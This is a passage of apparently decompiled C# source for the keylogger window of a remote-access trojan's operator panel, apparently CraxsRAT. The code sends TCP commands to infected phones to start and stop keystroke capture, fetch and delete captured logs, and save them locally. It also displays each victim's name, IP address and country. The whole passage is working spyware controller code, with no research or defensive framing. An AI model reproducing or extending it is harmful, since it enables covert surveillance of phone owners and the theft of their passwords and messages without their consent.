            this.clinameinfo.Dock = System.Windows.Forms.DockStyle.Fill;
            this.clinameinfo.Font = new System.Drawing.Font("Calibri", 9F);
            this.clinameinfo.ForeColor = System.Drawing.Color.Black;
            this.clinameinfo.Location = new System.Drawing.Point(13, 0);
            this.clinameinfo.Name = "clinameinfo";
            this.clinameinfo.Size = new System.Drawing.Size(774, 42);
            this.clinameinfo.TabIndex = 12;
            this.clinameinfo.Text = "...";
            this.clinameinfo.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.clinameinfo.Click += new System.EventHandler(this.clinameinfo_Click);
            // 
            // exitbtn
            // 
            this.exitbtn.BackColor = System.Drawing.Color.Transparent;
            this.exitbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.exitbtn.Dock = System.Windows.Forms.DockStyle.Right;
            this.exitbtn.FillColor = System.Drawing.Color.Transparent;
            this.exitbtn.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.exitbtn.FillPressColor = System.Drawing.Color.Black;
            this.exitbtn.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(254)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.exitbtn.Font = new System.Drawing.Font("Calibri", 12F);
            this.exitbtn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(254)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.exitbtn.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(254)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.exitbtn.Location = new System.Drawing.Point(787, 0);
            this.exitbtn.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.exitbtn.Name = "exitbtn";
            this.exitbtn.Radius = 10;
            this.exitbtn.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.exitbtn.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.exitbtn.RectHoverColor = System.Drawing.Color.White;
            this.exitbtn.RectPressColor = System.Drawing.Color.White;
            this.exitbtn.RectSelectedColor = System.Drawing.Color.White;
            this.exitbtn.Size = new System.Drawing.Size(173, 42);
            this.exitbtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.exitbtn.SymbolSize = 0;
            this.exitbtn.TabIndex = 49;
            this.exitbtn.Text = "Stop";
            this.exitbtn.Visible = false;
            this.exitbtn.Click += new System.EventHandler(this.Exitbtn_Click);
            // 
            // DrakeUIButtonIcon1
            // 
            this.DrakeUIButtonIcon1.BackColor = System.Drawing.Color.Transparent;
            this.DrakeUIButtonIcon1.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIButtonIcon1.Dock = System.Windows.Forms.DockStyle.Right;
            this.DrakeUIButtonIcon1.FillColor = System.Drawing.Color.Transparent;
            this.DrakeUIButtonIcon1.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.DrakeUIButtonIcon1.FillPressColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon1.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(254)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.DrakeUIButtonIcon1.Font = new System.Drawing.Font("Calibri", 12F);
            this.DrakeUIButtonIcon1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(254)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.DrakeUIButtonIcon1.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(254)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.DrakeUIButtonIcon1.Location = new System.Drawing.Point(960, 0);
            this.DrakeUIButtonIcon1.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.DrakeUIButtonIcon1.Name = "DrakeUIButtonIcon1";
            this.DrakeUIButtonIcon1.Radius = 10;
            this.DrakeUIButtonIcon1.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon1.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.DrakeUIButtonIcon1.RectHoverColor = System.Drawing.Color.White;
            this.DrakeUIButtonIcon1.RectPressColor = System.Drawing.Color.White;
            this.DrakeUIButtonIcon1.RectSelectedColor = System.Drawing.Color.White;
            this.DrakeUIButtonIcon1.Size = new System.Drawing.Size(179, 42);
            this.DrakeUIButtonIcon1.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIButtonIcon1.SymbolSize = 0;
            this.DrakeUIButtonIcon1.TabIndex = 50;
            this.DrakeUIButtonIcon1.Text = "Start";
            this.DrakeUIButtonIcon1.Visible = false;
            this.DrakeUIButtonIcon1.Click += new System.EventHandler(this.DrakeUIButtonIcon1_Click);
            // 
            // ClientPic
            // 
            this.ClientPic.Dock = System.Windows.Forms.DockStyle.Left;
            this.ClientPic.Location = new System.Drawing.Point(0, 0);
            this.ClientPic.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
            this.ClientPic.Name = "ClientPic";
            this.ClientPic.Size = new System.Drawing.Size(13, 42);
            this.ClientPic.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.ClientPic.TabIndex = 11;
            this.ClientPic.TabStop = false;
            // 
            // Keylogger
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(1139, 849);
            this.Controls.Add(this.keytabs);
            this.Controls.Add(this.Panel2);
            this.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.MaximumSize = new System.Drawing.Size(1157, 896);
            this.MinimumSize = new System.Drawing.Size(1157, 896);
            this.Name = "Keylogger";
            this.Opacity = 0D;
            this.ShowIcon = false;
            this.Text = "Keylogger";
            this.Load += new System.EventHandler(this.Keylogger_Load);
            ((System.ComponentModel.ISupportInitialize)(this.DGV0)).EndInit();
            this.ctxMenu.ResumeLayout(false);
            this.Panel1.ResumeLayout(false);
            this.keytabs.ResumeLayout(false);
            this.TabPage3.ResumeLayout(false);
            this.TabPage4.ResumeLayout(false);
            this.Panel3.ResumeLayout(false);
            this.Panel2.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.ClientPic)).EndInit();
            this.ResumeLayout(false);

    }

    public void CraxsStyle()
    {
        string language = RegistryHandler.Get_Language();
        if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
        {
            if (Operators.CompareString(language, "CN", TextCompare: false) == 0)
            {
                getbtn.Text = "得到";
                delbtn.Text = "删除";
                savedbtn.Text = "已下载";
                backallbtn.Text = "全部下载";
                deleteallbtn.Text = "删除所有";
                keytabs.TabPages[0].Text = "在线的";
                keytabs.TabPages[1].Text = "离线";
            }
        }
        else
        {
            getbtn.Text = "تحميل السجل";
            delbtn.Text = "حذف السجل";
            savedbtn.Text = "تم تنزيله";
            backallbtn.Text = "تحميل الكل";
            deleteallbtn.Text = "حذف الكل";
            keytabs.TabPages[0].Text = "مباشر";
            keytabs.TabPages[1].Text = "مسجل";
        }
    }

    public Keylogger()
    {
        base.Load += Keylogger_Load;
        base.Closing += Keylogger_Closing;
        combologs = new DrakeUIComboBox();
        Title = "null";
        IsActive = false;
        searchbefore = new List<DataGridViewRow>();
        lastFoundIndex = -1;
        InitializeComponent();
        Font = reso.f;
        CraxsStyle();
    }

    private void SpyStyle()
    {
    }

    private void TOpacity_Tick(object sender, EventArgs e)
    {
        if (base.Opacity != 1.0)
            base.Opacity += 0.1;
        else
            TOpacity.Enabled = false;
    }

    private void Keylogger_Load(object sender, EventArgs e)
    {
        DGV0.ColumnHeadersDefaultCellStyle.Font = reso.f;
        DGV0.DefaultCellStyle.Font = reso.f;
        DGV0.ContextMenuStrip = ctxMenu;
        base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\19.ico");
        try
        {
            ClientPic.Image = classClient.Wallpaper;
            clinameinfo.Text = "Name: " + classClient.ClientName + Strings.Space(2) + "IP: " + classClient.ClientAddressIP + Strings.Space(2) + "Country: " + classClient.Country;
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError);
            //////CraxsAlert.Showinformation("Sorry");
        }
        Text = Title;
     //   SpyStyle();
        SaveToolStripMenuItem.Visible = true;
        SaveAsToolStripMenuItem.Visible = true;
        TOpacity.Interval = SpySettings.T_Interval;
        TOpacity.Enabled = true;

        if (classClient != null)
        {
            TcpClient myClient = classClient.myClient;
            object[] parametersObjects = new object[4]
            {
                myClient,
                SecurityKey.KeysClient8 + Data.SPL_SOCKET + SecurityKey.Keylogger + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + "(unknown)",
                Codes.Encoding().GetBytes("null"),
                classClient
            };
            classClient.SendMessage(parametersObjects);
        }
    }

    private void getbtn_click(object sender, EventArgs e)
    {
        if (!IsActive)
            CraxsAlert.Showinformation("Accessibilty Not Enabled.");
       // Interaction.MsgBox("Accessibilty Not Enabled.");
        else if ((combologs.Text.Length < 1) | (combologs.Text == null))
        {
            Interaction.MsgBox("No  Logs Found...");
        }
        else if (classClient != null)
        {
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    Client,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "rd<*>" + combologs.Text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
                loadinglogs.Enabled = true;
                loadinglogs.Visible = true;
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
        }
    }

    private void Button2_Click(object sender, EventArgs e)
    {
        if (!IsActive)
            Interaction.MsgBox("Accessibilty Not Enabled.");
        else if ((combologs.Text.Length < 1) | (combologs.Text == null))
        {
            Interaction.MsgBox("No  Logs Found...");
        }
        else if (MessageBox.Show("Log will deleted completely ,\r\nAccept ?", "Keylogger", MessageBoxButtons.YesNo) == DialogResult.Yes && classClient != null)
        {
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    Client,
                    Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(SecurityKey.KeysClient2 + Data.SPL_SOCKET + "rdd<*>", Codes.BSEN(combologs.Text)), Data.SPL_SOCKET), array[0]), Data.SPL_SOCKET), array[1]), Data.SPL_SOCKET), SecurityKey.Lockscreen), Data.SPL_SOCKET), Conversions.ToString(0)), Data.SPL_SOCKET), Conversions.ToString(0)), Data.SPL_SOCKET), Data.SPL_ARRAY), Data.SPL_SOCKET), classClient.ClientRemoteAddress),
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
                combologs.Text = "";
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
        }
    }

    public void Done(object[] objs)
    {
        if (offlinetext.InvokeRequired)
        {
            OffLOG method = Done;
            offlinetext.Invoke(method, new object[1] { objs });
        }
        else
        {
            offlinetext.AppendText(Conversions.ToString(objs[0]));
            offlinetext.SelectionStart = Strings.Len(offlinetext.Text);
            offlinetext.ScrollToCaret();
            offlinetext.Select();
        }
    }

    public void cleait()
    {
        if (offlinetext.InvokeRequired)
        {
            clearold method = cleait;
            offlinetext.Invoke(method, new object[0]);
        }
        else
        {
            loadinglogs.Enabled = false;
            loadinglogs.Visible = false;
            offlinetext.Clear();
        }
    }

    private void Button3_Click(object sender, EventArgs e)
    {
        try
        {
            if (!Directory.Exists(classClient.FolderUSER + "\\OFFLINE_KEYLOGS"))
                Directory.CreateDirectory(classClient.FolderUSER + "\\OFFLINE_KEYLOGS");
            Process.Start(classClient.FolderUSER + "\\OFFLINE_KEYLOGS");
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void Delbtn_Click(object sender, EventArgs e)
    {
        if (!IsActive)
            Interaction.MsgBox("Accessibilty Not Enabled.");
        else if ((combologs.Text.Length < 1) | (combologs.Text == null))
        {
            Interaction.MsgBox("No  Logs Found...");
        }
        else
        {
            if (classClient == null)
                return;
            try
            {
                try
                {
                    string text = "this record will be removed completely from the phone , continue ?";
                    string language = RegistryHandler.Get_Language();
                    if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
                    {
                        if (Operators.CompareString(language, "CN", TextCompare: false) == 0)
                            text = "这条记录将从手机中彻底删除，继续吗？";
                    }
                    else
                        text = "سيتم حذف هذا السجل بالكامل من الهاتف ، هل تريد المتابعة؟";
                    if (MessageBox.Show(text, "Keylogger", MessageBoxButtons.YesNo) != DialogResult.Yes)
                        return;
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    Client,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "rdd<*>" + combologs.Text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
                combologs.Items.Remove(combologs.Text);
                combologs.Text = "";
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError2);
                //////CraxsAlert.Showinformation("Sorry");
            }
        }
    }

    private void Button3_Click_1(object sender, EventArgs e)
    {
        if (classClient == null)
            return;
        try
        {
            try
            {
                string text = "All record will be removed completely from the phone , continue ?";
                string language = RegistryHandler.Get_Language();
                if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
                {
                    if (Operators.CompareString(language, "CN", TextCompare: false) == 0)
                        text = "所有记录将从手机中完全删除，继续吗？";
                }
                else
                    text = "سيتم حذف جميع السجل بالكامل من الهاتف ، هل تريد المتابعة؟";
                if (MessageBox.Show(text, "Keylogger", MessageBoxButtons.YesNo) != DialogResult.Yes)
                    return;
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
            string[] array = classClient.Keys.Split(':');
            object[] parametersObjects = new object[4]
            {
                Client,
                SecurityKey.KeysClient2 + Data.SPL_SOCKET + "rdall<*>r" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                Codes.Encoding().GetBytes("null"),
                classClient
            };
            classClient.SendMessage(parametersObjects);
            combologs.Items.Clear();
            combologs.Text = "";
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void Backallbtn_Click(object sender, EventArgs e)
    {
        if (combologs.Items.Count < 1)
            Interaction.MsgBox("No  Logs Found...");
        else if (classClient != null)
        {
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    Client,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "rdall<*>g" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
        }
    }

    private void Searchbtn_Click(object sender, EventArgs e)
    {
        if (string.IsNullOrEmpty(offlinetext.Text))
        {
            CraxsAlert.Showinformation("No Data Found");
            return;
        }
        if (string.IsNullOrEmpty(searchtext.Text))
        {
            CraxsAlert.Showinformation("Enter Text to search First");
            return;
        }
        bool flag = true;
        string text = searchtext.Text;
        string text2 = offlinetext.Text;
        int num = text2.IndexOf(text, StringComparison.CurrentCultureIgnoreCase);
        if (num >= 0 && lastFoundIndex == num && lastFoundIndex < num)
        {
            lastFoundIndex = num;
            offlinetext.Select(num, text.Length);
            offlinetext.SelectionColor = Color.White;
            offlinetext.ScrollToCaret();
            flag = false;
        }
        if (flag)
            CraxsAlert.Showinformation("No Result Found");
    }

    private void Clearsrchbtn_Click(object sender, EventArgs e)
    {
        searchtext.Text = "";
        offlinetext.SelectAll();
        offlinetext.SelectionColor = Color.Black;
        offlinetext.SelectionStart = 0;
        lastFoundIndex = -1;
    }

    private void Searchtext_TextChanged(object sender, EventArgs e)
    {
        searchbefore.Clear();
        if (!string.IsNullOrEmpty(searchtext.Text))
            clearsrchbtn.Visible = true;
        else
            clearsrchbtn.Visible = false;
    }

    private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
    {
        if (classClient != null)
        {
            TcpClient myClient = classClient.myClient;
            object[] parametersObjects = new object[4]
            {
                myClient,
                SecurityKey.KeysClient8 + Data.SPL_SOCKET + SecurityKey.Keylogger + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + "(unknown)",
                Codes.Encoding().GetBytes("null"),
                classClient
            };
            classClient.SendMessage(parametersObjects);
        }
    }

    private void Exitbtn_Click(object sender, EventArgs e)
    {
        if (classClient != null)
        {
            classClient.Keylogg = false;
            object[] parametersObjects = new object[4]
            {
                Client,
                SecurityKey.KeysClient9 + Data.SPL_SOCKET + SecurityKey.Keylogger,
                Codes.Encoding().GetBytes("null"),
                classClient
            };
            classClient.SendMessage(parametersObjects);
        }
    }

    private void Keylogger_Closing(object sender, CancelEventArgs e)
    {
        if (classClient != null)
        {
            classClient.Keylogg = false;
            object[] parametersObjects = new object[4]
            {
                Client,
                SecurityKey.KeysClient9 + Data.SPL_SOCKET + SecurityKey.Keylogger,
                Codes.Encoding().GetBytes("null"),
                classClient
            };
            classClient.SendMessage(parametersObjects);
        }
    }

    private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
    {
        reso.Directory_Exist(classClient);
        ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
        {
            reso.SAVEit((Array)a0);
        }, new object[8]
        {
            DGV0,
            tmpFolderUSER,
            "Keylogger",
            tmpClientName,
            tmpCountry + " - " + tmpAddressIP,
            "Keylogger",
            "log",
            DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html"
        });
    }

    private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
    {
        SaveFileDialog saveFileDialog = new SaveFileDialog();
        saveFileDialog.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html";
        saveFileDialog.Filter = "html (*.html)|*.html";
        if (saveFileDialog.ShowDialog() == DialogResult.OK)
            ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
            {
                reso.SAVEit((Array)a0);
            }, new object[8]
            {
                DGV0,
                "null",
                saveFileDialog.FileName,
                tmpClientName,
                tmpCountry + " - " + tmpAddressIP,
                "Keylogger",
                "log",
                "null"
            });
        saveFileDialog.Dispose();
    }

    private void button1_Click(object sender, EventArgs e)
    {
        if (!IsActive)
            Interaction.MsgBox("Accessibilty Not Enabled.");
        else if ((combologs.Text.Length < 1) | (combologs.Text == null))
        {
            Interaction.MsgBox("No  Logs Found...");
        }
        else if (classClient != null)
        {
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    Client,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "rd<*>" + combologs.Text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
                loadinglogs.Enabled = true;
                loadinglogs.Visible = true;
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
        }
    }

    private void clinameinfo_Click(object sender, EventArgs e)
    {

    }
}
